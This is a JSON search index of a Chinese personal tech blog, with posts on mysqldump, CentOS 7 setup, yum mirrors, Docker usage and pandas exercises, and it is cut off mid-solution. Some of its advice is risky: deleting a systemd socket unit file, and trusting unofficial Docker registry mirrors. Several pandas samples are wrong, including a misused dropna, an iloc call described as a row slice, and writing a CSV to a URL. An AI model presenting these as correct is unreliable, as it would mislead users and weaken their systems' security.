[{"title":"我的第一篇博客","url":"/posts/d95d7e09/","content":"这是我的第一篇博客，我以后会在这里分享一些技术，生活或记录学习状况。\n同时我也会吸取一些建议或意见，进行修正。\n","categories":["分享"],"tags":["记录"]},{"title":"MySQL的备份与恢复 (mysqldump)","url":"/posts/4394775c/","content":"mysqldump 语法\nmysqldump [选项] 数据库名 [表名] &gt; 脚本.sql\n选项\n\n\n\n参数名\n缩写\n含义\n\n\n\n\n--host\n-h\n服务器IP地址\n\n\n--port\n-P (大写)\n服务器端口号\n\n\n--password\n-p (小写)\nMySQL密码\n\n\n--databases\n\n指定要备份的数据库\n\n\n--all-databases\n\n备份MySQL服务器上的所有数据库\n\n\n--compact\n\n压缩模式，产生更少的输出\n\n\n--comments\n\n添加注释信息\n\n\n--complete-insert\n\n输出完成的插入语句\n\n\n--lock-tables\n\n备份前，锁定所有数据库表\n\n\n--no-create-db/–no-create-info\n\n禁止生成创建数据库语句\n\n\n--force\n\n当出现错误时仍然继续备份操作\n\n\n--default-character-set\n\n指定默认字符集\n\n\n--add-locks\n\n备份数据库表时锁定数据库表\n\n\n\n示例\n如果 -p 选项没有指定密码，那么控制台会等待输入密码\n备份所有数据库\nmysqldump -uroot -p --all-databases &gt; all.sql\n备份指定数据库\nmysqldump -uroot -p test &gt; test.sql\n备份指定数据库指定表(多个表以空格间隔)\nmysqldump -uroot -p test table1 table2 &gt; test.sql \n备份指定数据库排除某些表\nmysqldump -uroot -p test --ignore-table=test.table1 --ignore-table=test.table2 &gt; test.sql\n恢复命令\n命令行命令\n注：在导入备份数据库前，db_name如果没有，是需要创建的； 而且与db_name.sql中数据库名是一样的才可以导入。mysqladmin -uroot -p create db_name mysql -uroot -p db_name &lt; /backup/mysqldump/db_name.sql\nsoure 方法\nmysql &gt; use db_namemysql &gt; source /backup/db_name.sql\n\n    table th:nth-child(2){\n        width: 5rem;\n    }\n","categories":["MySQL"],"tags":["SQL","MySQL","备份"]},{"title":"Centos7 的安装与配置 - 1","url":"/posts/88be706e/","content":"下载镜像\n以下内容仅按照我的配置写的，如有不足评论一下。\n首先下载Centos7的镜像，这里我用的 阿里云的镜像\n\n进入 7.9.2009/isos/x86_64/，下载 CentOS-7-x86_64-NetInstall-2009.iso\n\n如果打开只有一个 readme 文件，说明这个版本的镜像没有提供下载。\n\n安装\n首先打开 VMware，创建新的虚拟机，这里安装到虚拟机里面 (物理机应该也是一样的)\n\n选择自定义(高级)，然后下一步\n\n\n这里选择稍后安装操作系统，然后下一步\n\n这里选择Centos7 64位\n\n这里可以给虚拟机起名字。\n位置选C盘以外的盘，因为最后生成的虚拟机文件比较大(只有一个C盘当我没说…)\n\n这里可以设置虚拟机的处理器(不懂别瞎选，默认的就行)\n\n这里设置内存(不懂别瞎选，默认的就行)\n\n这里建议选默认的 使用网络地址转换(NAT)\n\n后面的默认推荐就可以\n\n\n创建新虚拟磁盘，而后下一步\n\n这里可以设置磁盘大小，也就是虚拟机的硬盘大小\n选 将虚拟磁盘存储为单个文件，而后下一步\n\n\n完成！\n\n\n","categories":["操作系统"],"tags":["Centos7","Linux"]},{"title":"Hexo 图片资源显示","url":"/posts/a6886184/","content":"安装 hexo-renderer-markdown-it\nhexo-renderer-markdown-it官网\n# 如果安装过 hexo-renderer-marked，就卸载npm un hexo-renderer-markednpm i hexo-renderer-markdown-it\n修改_config.yml\n将 post_asset_folder 改为true\n\n重新生成静态文件，并运行\nhexo clean &amp; hexo g &amp; hexo server","categories":["Hexo"],"tags":["bug"]},{"title":"Centos7 的安装与配置 - 2","url":"/posts/11b721d4/","content":"右键标签栏，点击设置\n\n选择 CD/DVD，选择下载好的ISO镜像，点击确定\n\n开机！\n\n开机之后，用方向键选择 Install Centos7 选项，按回车确认\n\n选择语言\n\n下滑选择安装位置\n\n不会配置的选下面的自动配置分区，而后点击完成\n\n配置安装源\n\n如果配置是灰色的话，就像这样，就是没有连接网络，需要先连一下网络\n点击完成回到刚才的页面\n\n点击网络和主机名\n\n\n连接到网络后，再次配置安装源，将安装源设置为国内的。\nhttp://mirrors.aliyun.com/centos/7/os/x86_64/\n\n软件选择\n\n这里我选择的是最小安装，方便学习和记录\n\n\n在安装过程中可以根据需求来判断是否设置root密码或者创建用户\n我不需要创建用户，所以我没有创建\n漫长的等待……\n\nCentos7！启动！！\n\n输入你的用户名和密码\n没有创建用户的话就只有root用户\n\n这样就装好了~\n\n","categories":["操作系统"],"tags":["Centos7","Linux"]},{"title":"换 yum 源","url":"/posts/241dfea9/","content":"备份原有源配置文件\nsudo mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup\n下载国内源配置文件(这里用的是阿里云的仓库)，并移动到源目录里\nsudo curl -O http://mirrors.aliyun.com/repo/Centos-7.reposudo mv Centos-7.repo /etc/yum.repos.d/CentOS-Base.repo\n刷新yum缓存\nsudo yum clean allsudo yum makecache fast\n检查是否更换成功\nsudo yum repolist\n更新软件包\nyum -y update\n至此，换源完成~\n","categories":["配置"],"tags":["Centos7","Linux","配置","config","yum"]},{"title":"安装并使用 docker-ce","url":"/posts/be729bfc/","content":"下载\n从阿里云下载 docker-ce 仓库，并将仓库文件移动到 /etc/yum.repos.d/ 目录下\nsudo curl -O https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.reposudo mv docker-ce.repo /etc/yum.repos.d/\n刷新yum缓存\nsudo yum clean allsudo yum makecache fast\n查看 docker-ce 源是否添加成功\nyum list docker-ce\n安装\n安装 docker-ce\nsudo yum install docker-ce -y\n执行命令查看是否安装成功\ndocker info\n如果出现这种错误，说明没有运行\n\ndocker 的启动与停止\n# 启动 dockerservice docker start# 守护进程重启systemctl daemon-reload# 重启 docker 服务(二选其一即可)systemctl restart dockerservice docker restart# 关闭 docker (二选其一即可)systemctl stop dockerservice docker stop\n常用docker命令\n查看镜像\ndocker images \n搜索镜像\ndocker search 镜像名称\n拉取镜像\ndocker pull 镜像名称\n按镜像id删除镜像\ndocker rmi 镜像id\n删除所有镜像\ndocker rmi $(docker images -q)\n查看正在运行的容器\ndocker ps\n查看所有容器\ndocker ps -a \n查看最后一次运行的容器\ndocker ps -l\n查看停止的容器\ndocker ps -f status=exited\n创建容器\ndocker run    -i：表示运行容器    -t：表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。交互式    --name :为创建的容器命名。    -v：表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。注意：最好做目录映射，在宿主机上做修改，然后共享到容器上。    -d：在run后面加上-d参数,则会创建一个守护式容器在后台运行（这样创建容器后不会自动登录容器，如果只加-i -t两个参数，创建后就会自动进去容器）。    -p：表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p做多个端口映射\n创建并进入容器，退出停止(交互式)\ndocker run -it --name=容器名称 镜像名称:标签 /bin/bash\n退出当前容器\nexit\n守护式创建容器\n创建但不登陆\ndocker run -di --name=容器名称 镜像名称:标签\n创建并登陆\ndocker exec -it 容器名称(或者容器id) /bin/bash\n停止与启动容器\n停止容器\ndocker stop 容器名称(或者容器id)\n启动容器\ndocker start 容器名称(或者容器id)\n文件拷贝\n将文件拷贝到容器内\ndocker cp 需要拷贝的文件或目录 容器名称:容器目录\n将文件从容器内拷贝出来\ndocker cp 容器名称:容器目录 需要拷贝的文件或目录\n目录挂载\n在创建容器的时候，将宿主机的目录与容器内的目录进行映射，这样就可以通过修改宿主机某个目录的文件从而去影响容器。创建容器添加-v参数 后边为 宿主机目录:容器目录，例如：\ndocker run -di -v /usr/local/myhtml:/usr/local/myhtml --name=mycentos centos:7\n迁移与备份\n将容器保存为镜像\ndocker commit 容器名称 镜像名称\n将镜像保存为 tar 文件\ndocker save -o image.tar 镜像名称\n恢复镜像\n# 恢复之前先删除原有的镜像docker load -i image.tar\n私有仓库搭建与配置\n拉取私有仓库镜像\ndocker pull registry\n启动私有仓库容器\ndocker run -di --name=registry -p 5000:5000 registry\n打开浏览器，访问 http://宿主机ip:5000/v2/_catalog，返回{“repositories”:[]}表明私有仓库搭建成功，并且内容为空\n修改daemon.json\nvi /etc/docker/daemon.json\n添加或修改以下内容，而后保存退出，此步用于让 docker 信任私有仓库地址\n&#123;&quot;insecure-registries&quot;:[&quot;宿主机ip:5000&quot;]&#125; \n重启docker服务\nsystemctl restart docker\n镜像上传至私有仓库\n标记此镜像为私有仓库的镜像\ndocker tag redis 宿主机ip:5000/redis\n再次启动私有仓库\ndocker start registry\n上传标记的镜像到私有仓库\ndocker push 宿主机ip:5000/redis\n可能会出现的错误或警告\nWarning: Stopping docker.service, but it can still be activated by: docker.socket\n一般出现在停止docker运行的时候，原因是 Docker 在关闭状态下被访问自动唤醒机制，意味如果试图连接到 docker socket，而 docker 服务没有运行，系统将自动启动docker。\n解决办法\n方法1、(推荐)\nsystemctl stop docker.socket\n方法2、\n删除docker.socket\nrm -f /lib/systemd/system/docker.socket\nError response from daemon: Get &quot;https://registry-1.docker.io/v2/&quot;: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n这种错误是因为国内把docker的官方源墙了，所以访问不了。\n开始换源\n而后进入/etc/docker修改daemon.json，如果没有这个json文件就新建一个\n如果是用snap安装的docker，则进入/var/snap/docker/current/config/目录修改daemon.json\ncd /etc/docker# 查看有没有daemon.json文件ls# 如果没有就新建touch daemon.json\n编辑daemon.json\nvi daemon.json\n添加以下配置\n&#123;  &quot;registry-mirrors&quot;:[        &quot;https://docker.1panel.live&quot;,        &quot;https://hub.rat.dev&quot;,        &quot;https://docker.registry.cyou&quot;,        &quot;https://docker-cf.registry.cyou&quot;,        &quot;https://dockercf.jsdelivr.fyi&quot;,        &quot;https://docker.jsdelivr.fyi&quot;,        &quot;https://dockertest.jsdelivr.fyi&quot;,        &quot;https://docker.nju.edu.cn&quot;,        &quot;https://docker.mirrors.sjtug.sjtu.edu.cn&quot;,        &quot;https://mirror.iscas.ac.cn&quot;,        &quot;https://docker.rainbond.cc&quot;,        &quot;https://dockerhub.icu&quot;,        &quot;https://hub.uuuadc.top&quot;,        &quot;https://docker.anyhub.us.kg&quot;,        &quot;https://docker.awsl9527.cn&quot;  ]&#125;\n然后重启docker即可，上面的那些源有可能某些失效了，视情况决定是否删除。\nservice docker restart# 如果用的是snap安装的dockersnap restart docker\nJob for docker.service failed because start of the service was attempted too often. See “systemctl status docker.service” and “journalctl -xe” for details. To force a start use “systemctl reset-failed docker.service” followed by “systemctl start docker.service” again.\n这个错误有可能是daemon.json文件里面可能有语法错误导致启动不了，检查这个文件哪里写错了。\nCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n这个错误是没有启动docker，启动一下就行了\nsystemctl start dockerservice docker restart# 如果用的是snap安装的dockersnap restart docker\nWarning: docker.service changed on disk. Run ‘systemctl daemon-reload’ to reload units.\n根据提示执行命令即可\nsystemctl daemon-reload","categories":["安装","使用","配置"],"tags":["Centos7","Linux","docker"]},{"title":"Pandas 库的使用","url":"/posts/1701cff7/","content":"本文按照pandas文档来总结的，如果有错误的地方，欢迎指正\nhttps://pandas.ac.cn/docs/\n安装 pandas\npip install pandas\n导入 pandas\nimport pandas as pd\n读取表格或数据库\n数据库以MySQL为例\n支持相对路径，绝对路径，网络路径\n读取操作返回DataFrame\nimport pandas as pdimport pymysql# 在读取的时候添加parse_dates=[&quot;列名&quot;]，可使这个列变为Timestamp类型# 读取csv表格文件pd.read_csv(&quot;data.csv&quot;)# 读取xlsx或者xls表格文件pd.read_excel(&quot;data.xlsx&quot;)# 读取MySQL# 首先创建数据库连接对象conn = pymysql.connect(    host=&quot;localhost&quot;, # 数据库地址    port=3306, # 数据库端口    user=&quot;root&quot;, # 登录用户名    password=&quot;123456&quot;, # 登录密码    database=&quot;example&quot;, # 数据库名称    charset=&quot;utf8&quot; # 编码格式)#执行sql操作# %s 是占位符, index_col 是索引字段,可以是字符串也可以是列表sql = &quot;select * from user limit %s,%s&quot;pd.read_sql(sql,con=conn,params=[10,20],index_col=[&quot;id&quot;,&quot;type&quot;])\n写入表格\n# 写 csv 文件import pandas as pd# 读取read.csv表格data_read = pd.read_csv(&quot;read.csv&quot;)# 将read.csv表格写入到write.csv表格,并去除索引,在写入时不能打开write.csvdata_read.to_csv(&quot;write.csv&quot;,index=False) # 将read.csv表格写入到write.txt文件里，并设置分割方式，去除索引,在写入时不能打开write.txtdata_read.to_csv(&quot;write.txt&quot;,sep=&quot;\\t&quot;,index=False)# 将read.csv表格写入到write.xlsx表格,并去除索引,在写入时不能打开write.xlsxdata_read.to_excel(&quot;write.xlsx&quot;,index=False)\n选择 DataFrame 的子集\nimport pandas as pddata = pd.read_csv(&quot;data.csv&quot;)\n选择数值列\ndata.describe()\n选择特定列\n# 选择Age列ages = data[&quot;Age&quot;]ages.head()# 选择Name列和Age列name_age = data[[&quot;Name&quot;,&quot;Age&quot;]]name_age.head()\n选择特定行\n# 筛选年龄超过35岁的乘客# data[&quot;Age&quot;] &gt; 35 将判断每一条数据的Age字段是否大于35ages = data[data[&quot;Age&quot;] &gt; 35]ages.head()# 筛选泰坦尼克号 2 等舱和 3 等舱的乘客# 第一种写法class_23 = data[data[&quot;class&quot;].isin([2,3])]# 第二种写法# 注: 不能用 or/and,需要用or运算符 | 和and运算符 &amp;class_23 = data[(data[&quot;class&quot;] == 2) | (data[&quot;class&quot;] == 3)]class_23.head()# 获取已知年龄的乘客数据ages_no_na = data[data[&quot;Age&quot;].notna()]ages_no_na.head() \n选择特定的行和列\n需要在选择括号 [] 前面使用 loc/iloc 运算符。使用 loc/iloc 时，逗号前面的部分是要选择的行，逗号后面的部分是要选择的列\nloc是基于行标签和列标签进行索引的，基本用法为 DataFrame.loc[行标签,列标签]\niloc是基于行和列的位置进行索引的，索引从0开始，基本用法为 DataFrame.iloc[行位置,列位置]\n# 年龄大于35岁的乘客的姓名names = data.loc[data[&quot;Age&quot;] &gt; 35,&quot;Name&quot;]names.head()# 获取第十行到30行的数据datas = data.iloc[9,30]datas.head()\n从现有列创建新列\nimport pandas as pddata = pd.read_csv(&quot;data.csv&quot;)# 创建Age2列，值为Age列的2倍data[&#x27;Age2&#x27;] = data[&#x27;Age&#x27;] * 2\n修改列名称\nimport pandas as pddata = pd.read_csv(&quot;data.csv&quot;)data.rename(    columns=&#123;        &quot;现有列名称&quot;:&quot;新名称&quot;,        &quot;Age&quot;:&quot;年龄&quot;,        &quot;name&quot;:&quot;姓名&quot;    &#125;)# 也可以映射data.rename(columns=str.lower)\n计算汇总统计量\nimport pandas as pddata = pd.read_csv(&quot;data.csv&quot;)\n平均值\ndata[&quot;Age&quot;].mean()\n中位数\ndata[&quot;Price&quot;].median()\n特定组合\ndata.agg(    &#123;        &quot;Age&quot;: [&quot;min&quot;,&quot;max&quot;,&quot;median&quot;,&quot;skew&quot;],        &quot;Fare&quot;: [&quot;min&quot;,&quot;max&quot;,&quot;median&quot;,&quot;mean&quot;]    &#125;)\n按类别分组的汇总统计量\n1、男性和女性泰坦尼克号乘客的平均年龄是多少？\n# 先查询出Sex字段和Age字段的数据，然后将数据根据Sex分组，最后求年龄的平均值data[[&#x27;Sex&#x27;,&#x27;Age&#x27;]].groupby(&quot;Sex&quot;).mean()# 如果没有显式的选择Sex和Age两列，那么就需要使用numeric_only=True应用包含数值列的每一项data.groupby(&quot;Sex&quot;).mean(numeric_only=True)# 也可以对分组数据的列选择data.groupby(&quot;Sex&quot;)[&#x27;Age&#x27;].mean()\n2、每个性别和客舱等级组合的平均票价是多少？\ndata.groupby([&quot;Sex&quot;,&quot;Pclass&quot;])[&#x27;Fare&#x27;].mean()\n按类别统计记录数\n1、每个客舱等级有多少乘客？\n# value_counts是一个快捷方式，它实际上是分组操作与每个组内记录数的计数相结合# 两个相同data[&#x27;Pclass&#x27;].value_counts()data.groupby(&quot;Pclass&quot;)[&#x27;Pclass&#x27;].count()# size 和 count 都可以与 groupby 结合使用。而 size 包含 NaN 值，只提供行数（表格的大小），count 排除缺失值。在 value_counts 方法中，使用 dropna 参数来包含或排除 NaN 值。data.groupby(&quot;Pclass&quot;)[&#x27;Pclass&#x27;].size()\n排序\n# 根据Age进行排序# 基本用法: sort_values(by,axis,ascending,inplace,kind,na_position)# by: 根据哪一列排序,可以为一个列表# axis: 轴来指导排序# ascending: 如果为真，按升序排序，否则按降序排序# inplace: 如果为真，就地执行操作# kind: 选择排序算法# na_position: 参数&#x27;first&#x27;将NaNs放在开头，&#x27;last&#x27;将NaNs放在结尾titanic.sort_values(by=&quot;Age&quot;).head()# sort_index和sort_value基本相似,只是一个按索引排序，一个按字段排序\n数据重塑\n# pivot(data,columns,index,values)# data: 数据帧# columns: str | object | str列表，用于创建新框架的列的列# index: str | object | str列表，可选，用于创建新帧索引的Column，如果未给出，则使用现有索引# values: str、对象或上一个列表，可选，用于填充新帧值的列，如果不指定，则将使用所有剩余列，结果将具有分层索引列# 返回重塑的DataFramedata.pivot()\n透视表\n在 pivot() 的情况下，数据只是重新排列。当需要聚合多个值时，可以使用 pivot_table()，它提供一个聚合函数（例如平均值）来组合这些值。\ndata.pivot_table(values=&quot;value&quot;, index=&quot;location&quot;, columns=&quot;parameter&quot;, aggfunc=&quot;mean&quot;)\n创建新索引\nreset_index()\ndata.pivot(columns=&quot;location&quot;, values=&quot;value&quot;).reset_index()\n合并\ndata1 = pd.read_csv(&quot;data1.csv&quot;)data2 = pd.read_csv(&quot;data2.csv&quot;)pd.concat([data1,data2],axis=0)\nmerge\n基本用法: merge(left,right,how,on,left_on,right_on,left_index,right_index,sort,suffixes,copy,indicator,validate)\n详细解释见: https://pandas.pydata.org/docs/reference/api/pandas.merge.html#pandas.merge\n时间序列数据\npd.to_datetime(data[&quot;datetime&quot;])\n操作文本\n# 将Name字段的所有内容全部转为小写data[&#x27;Name&#x27;].str.lower# 分割Name字段的所有内容data[&#x27;Name&#x27;].str.split(&quot;,&quot;)# 基本用法: contains(pat,case,flags,na,regex)# pat: 字符串或正则# case: 是否区分大小写，默认True# flags: 默认0，传递给 re 模块的标志，例如 re.IGNORECASE 的 CASE。# na: 可选,默认对空值不处理，即输出结果还是nan# 文本包含,是否包含Countess字符串，包含返回True，不包含返回False，NaN返回NaNdata[&#x27;Name&#x27;].str.contains(&quot;Countess&quot;)# 获取Name长度data[&#x27;Name&#x27;].str.len()# 获取名字最长的那一个Namedata.loc[data[&#x27;Name&#x27;].str.idxmax(),&quot;Name&quot;]# 替换，将“male”的值替换为“M”，将“female”的值替换为“F”。data[&#x27;Name&#x27;].replace(&#123;&quot;male&quot;: &quot;M&quot;, &quot;female&quot;: &quot;F&quot;&#125;)","categories":["python"],"tags":["python","pandas"]},{"title":"Pandas 例题 - 1","url":"/posts/ef59dde3/","content":"电商订单数据清洗\n任务详情\n请根据系统提供的订单数据表，按要求完成以下任务：\n统计订单表格中，商品描述(choice_description)中为“NaN”的数量，并将其批量替换为“banana”，\n请根据以上要求，将函数 nanCount() 补充完整，函数的返回值为整数值，既为“NaN”的数量。\n任务要求\n\n订单数据表为以逗号为分隔符的csv文件，编码方式为 UTF-8；\n注意：DataFrame 由后台生成，作为参数 order_data 传递到 nonCount() 中，不需要生成新的 DataFrame；\nDataFrame 读取为订单数据表；\n返回值为 NaN 的数量，int 数据类型。\n订单数据表.csv\n\nimport pandas as pdclass Solution:    def nanCount(self)-&gt; int:        # 读取csv文件        order_data = pd.read_csv(&#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/63/fj_order_data.csv&#x27;, encoding=&#x27;utf-8&#x27;)        # choice_description 为空的记录求和         nan_count = order_data[&#x27;choice_description&#x27;].isna().sum()        # 将 choice_description 为空的记录填充为 banana        order_data[&#x27;choice_description&#x27;].fillna(&#x27;banana&#x27;, inplace=True)        # 将修改写入文件        order_data.to_csv(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/63/fj_order_data.csv&quot;, index=False, encoding=&#x27;utf-8&#x27;)        # 返回 choice_description 列为空的记录数        return nan_count\n电商订单数据计算\n任务详情\n请根据系统提供的订单数据表，按要求完成以下三个任务：\n传入一个字符串，返回订单总金额 (quantity * item_price) 最大或最小的商品，并返回商品的名称(item_name)。\n请根据以上要求，将函数 salesStr() 补充完整，函数的返回值为字符(str)，比如：“Steak Burrito”\n订单数据访问地址请见下方：\n\n\n\n字段名\n中文含义\n\n\n\n\norder_id\n商品编号\n\n\nquantity\n数量\n\n\nitem_name\n商品名称\n\n\nchoice_description\n描述\n\n\nitem_price\n单价\n\n\n\n任务要求\n\n传入一个字符串(‘max’ 或 ‘min’)，返回订单总金额最大或最小的商品的名称(item_name) ；\n传入的字符串不区分大小写，即传入值可能是&quot;Max&quot;，也可能是&quot;max&quot;；\n传入&quot;max&quot;，返回订单总金额 (quantity * item_price) 最大的商品名称；传入“min”，返回订单总金额 (quantity * item_price) 最小的商品名称；\n返回字符串区分大小写，且保留字符串中间空格。\n订单数据表.csv\n\nclass Solution:    def salesStr(self, condition: str)-&gt; str:        condition = condition.lower()        url = &#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/80/fj_order_data.csv&#x27;        chipo = pd.read_csv(url, sep=&#x27;,&#x27;)        chipo[&quot;item_price&quot;] = chipo[&quot;item_price&quot;].str.replace(&quot;$&quot;, &#x27;&#x27;, regex=False).astype(float)        chipo[&quot;total_price&quot;] = chipo[&quot;quantity&quot;] * chipo[&quot;item_price&quot;]        chipo_sum = chipo.groupby(&quot;item_name&quot;)[[&#x27;quantity&#x27;, &quot;item_price&quot;]].sum().reset_index()        chipo_sum[&quot;total_price&quot;] = chipo_sum[&quot;quantity&quot;] * chipo_sum[&quot;item_price&quot;]        result = &#x27;&#x27;        if condition == &quot;max&quot;:            result = chipo_sum[chipo_sum[&quot;total_price&quot;] == chipo_sum[&quot;total_price&quot;].max()][&quot;item_name&quot;].tolist()[0]        elif condition == &quot;min&quot;:            result = chipo_sum[chipo_sum[&quot;total_price&quot;] == chipo_sum[&quot;total_price&quot;].min()][&quot;item_name&quot;].tolist()[0]        return result\nDataFrame计算平均值\n任务详情\n给定一个DataFrame对象 df，要求返回各行的平均值。\n具体操作如下：\n1.添加新列 ‘avg’ 用于计算各行的平均值；\n2.使用数组返回新列 ‘avg’。\n任务要求\n1.程序接收 DataFrame 对象 df，返回结果是 list 数据类型；\n2.注意：平均值需要四舍五入保留两位小数。\n测试用例\n输入：\n\n\n\n\n0\n1\n2\n3\n4\n5\n6\n\n\n\n\n0\n24\n27\n7\n23\n25\n7\n21\n\n\n1\n16\n30\n8\n4\n26\n30\n8\n\n\n2\n18\n28\n7\n17\n17\n16\n25\n\n\n\n输出：\n[19.14, 17.43, 18.29]\n解释：首先生成新列’avg’，需要注意平均数需要四舍五入保留小数点后两位\n\n\n\n\n0\n1\n2\n3\n4\n5\n6\navg\n\n\n\n\n0\n24\n27\n7\n23\n25\n7\n21\n19.14\n\n\n1\n16\n30\n8\n4\n26\n30\n8\n17.43\n\n\n2\n18\n28\n7\n17\n17\n16\n25\n18.29\n\n\n\n输入：\n\n\n\n\n0\n1\n2\n3\n\n\n\n\n0\n10\n19\n4\n7\n\n\n1\n9\n5\n28\n14\n\n\n2\n30\n27\n1\n13\n\n\n3\n21\n14\n19\n9\n\n\n4\n1\n25\n30\n16\n\n\n\n输出：[10.0, 14.0, 17.75, 15.75, 18.0]\n解释：首先生成新列’avg’，其次返回’avg’列\n\n\n\n\n0\n1\n2\n3\navg\n\n\n\n\n0\n10\n19\n4\n7\n10.00\n\n\n1\n9\n5\n28\n14\n14.00\n\n\n2\n30\n27\n1\n13\n17.75\n\n\n3\n21\n14\n19\n9\n15.75\n\n\n4\n1\n25\n30\n16\n18.00\n\n\n\nclass Solution:    def CalAvg(self, df: &#x27;pd.DataFrame&#x27;) -&gt; list:        df[&#x27;avg&#x27;] = round(df.mean(axis=1), 2)        return list(df[&#x27;avg&#x27;])\n乐高商店收入计算\n题目描述\n我们需要完成乐高商店的分析，请你根据指引完成以下任务：\n1.使用 Pandas 读取数据；\n2.去掉没有价格的数据，将销量为空的数据填充为0；\n3.计算所有产品总收入；\n4.计算该数据中产品价格的平均值;\n5.程序后台传入产品标题title，要求计算该产品的收入（收入总计）；\n6.将总收入、平均价格、产品收入保存到列表里，返回给后台。\n题目要求\n1.程序传入标题title数据类型是str；\n2.程序传出数据类型是列表类型，列表中所有元素的数据类型均是 float；\n3.如果产品标题title存在多个，则计算相同title商品的总收入；\n4.平均价格需要四舍五入保留小数点后2位。\n测试用例\n输入：’乐高旗舰店官网大电影系列70837Shimmer&amp;Shine闪亮水疗馆玩具积木’\n输出；[xxx, xxx, 1598.0]\n解释：总收入和平均价格隐藏，当前产品收入总计是1598.0\n输入：’乐高旗舰店幻影忍者系列70668雷电忍者杰的暴风战机’\n输出：[xxx, xxx, 259073.0]\n解释：总收入和平均价格隐藏，当前产品收入总计是259073.0\n输入：’乐高旗舰店官网创意百变高手系列10261大型过山车积木成人送礼’\n输出：[xxx, xxx, 41986.0]\n数据说明\n文本数据是excel文件，字段含义如下：\n\n\n\n字段\n含义\n实例\n\n\n\n\ntitle\n商品名\n乐高旗舰店官网 LEGO积木 儿童玩具男孩 积木拼装玩具益智\n\n\nage_range\n商品对应的年龄等级\n适用年纪6+岁\n\n\nprice\n商品价格\n899.0\n\n\nsales_num\n售卖数量\n217.0\n\n\n\n乐高天猫店销售数据\nimport pandas as pdclass Solution:    def task(self, title):        df = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/241/fj_lego_tmallshop_sales_data.xlsx&quot;)        df[&quot;price&quot;] = df[&quot;price&quot;].dropna()        df[&quot;sales_num&quot;] = df[&quot;sales_num&quot;].fillna(0)        df[&quot;amount&quot;] = df[&quot;price&quot;] * df[&quot;sales_num&quot;]        all = df[&quot;amount&quot;].sum()        avg = df[&quot;price&quot;].mean()        p = df[df[&quot;title&quot;] == title][&quot;amount&quot;].sum()        return [round(all, 2), round(avg, 2), round(p, 2)]\n部门平均薪资汇总计算\n任务说明\n读取给定的职工薪酬考勤簿，职工薪酬考勤簿由两个表格组成，分别是 基本薪资 工作表和 上班通勤 工作表。要求计算每一个部门内部的平均薪资，并把结果 降序 排列，返回给判定程序。\n员工个人薪酬计算过程如下：\n1.薪资由两部分组成， 月基本薪资 和 通勤工资，另外需要扣除需要缴纳的 社保费及公积金；\n2.月基本薪资 = 基本薪资 + 岗位工资 + 绩效工资；\n3.通勤工资中计算如下：\n日薪 = (基本薪资 + 岗位工资 + 绩效工资) / 应出勤天数\n时薪 = 日薪 / 8\n4.通勤工资中，法定节假日加班薪资是工作日加班的 2 倍，周末加班工资是工作日加班的 1.5 倍，工作日加班工资与时薪 相同；\n5.通勤工资需要扣除因请假导致的缺勤，请假/小时需要扣除的工资按照时薪计算。\n6.社保费及公积金个人缴费按照社会保险缴费基数计算：\na.养老保险个人缴费比例是 8%\nb.医疗保险个人缴费比例是 2%\nc.失业保险个人缴费比例是 1%\nd.公积金缴费比例是 10%\n示例：\n小王基本薪资 2000，岗位工资 2000，社会保险缴费基数是 2000。绩效工资 0，应出勤天数 20 天，请假 1 天，工作日加班 8 小时，法定节假日加班 4 小时，周末加班 4 小时。\n小王基本薪资+岗位工资+绩效工资是：2000 + 2000 = 4000；\n小王时薪：4000 / 20 / 8 = 25；\n小王加班工资：25 * 8 + 25 * 4 * 1.5 + 25 * 4 * 2 = 550；\n小王请假扣除：25 * 8 = 200；\n小王五险一金扣除：2000 * 0.08 + 2000 * 0.02 + 2000 * 0.01 + 2000 * 0.1 = 420；\n小王本月实发工资：4000 + 550 - 200 - 420 = 3930。\n假设小王所在部门有 5 个人，5 个人工资分别是 4050，4010，4120，4000，4500。小王所在部门的平均工资是：(3930+ 4010 + 4120 + 4000 + 4500) /5 = 4112。同理可算出其他部门的平均工资。\n注意：返回结果需四舍五入保留小数点后两位！\n返回结果参数类型是 pd.Series。Series 的索引应为部门名，Series 的数据应为部门平均工资，Series 的 Name 属性应修改为 “平均薪资”。\n任务要求\n1.程序无需接收参数输入，需要返回结果参数的格式是 pd.Series；\n2.返回结果时需要四舍五入保留小数点后两位，计算过程内保留小数点后两位可能导致最后结果不正确；\n3.部门平均工资需要降序排列；\n4.本题所需的基本薪资表和上班通勤表均在职工薪酬工作簿中，按需读取。\n5.Series 数据的类型应为 float 64，Name 属性应为 “平均薪资”。\n6.index 的属性名应为部门。\n测试用例\n部分返回数据：\n部门  销售部       15767.86运营部       ****工程部       ****  财务部       ****  研发部       ****  市场部       ****  人力资源部    4233.27  Name: 平均薪资, dtype: float64\n附件信息\n职工薪酬簿.xlsx，职工薪酬工作簿由 基本薪资 工作表和 上班通勤 工作表组成。\n1.基本薪资工作表。基本薪资工作表包含个人所属部门，各部分薪资状况和社会保险缴纳基数。共 7 个部门共 50 条数据，其中只有销售部有绩效工资。\n2.上班通勤工作表。上班通勤工作表包含本月应出勤天数，实际出勤天数。请假加班天数等。工作表中的名字与基本薪资工作表中的名字一一对应。共 50 条数据。\n职工薪酬工作簿\nimport pandas as pdclass Solution:        def department_salary_summary(self) -&gt; pd.Series:        basic_df = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/242/fj_employee_salary_work_books.xlsx&quot;, sheet_name=&quot;基本薪资&quot;)        commute_df = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/242/fj_employee_salary_work_books.xlsx&quot;, sheet_name=&quot;上班通勤&quot;)        basic_df[&quot;月基本薪资&quot;] = basic_df[&quot;基本薪资&quot;] + basic_df[&quot;岗位工资&quot;] + basic_df[&quot;绩效工资&quot;]        basic_df[&quot;日薪&quot;] = (basic_df[&quot;月基本薪资&quot;] /                            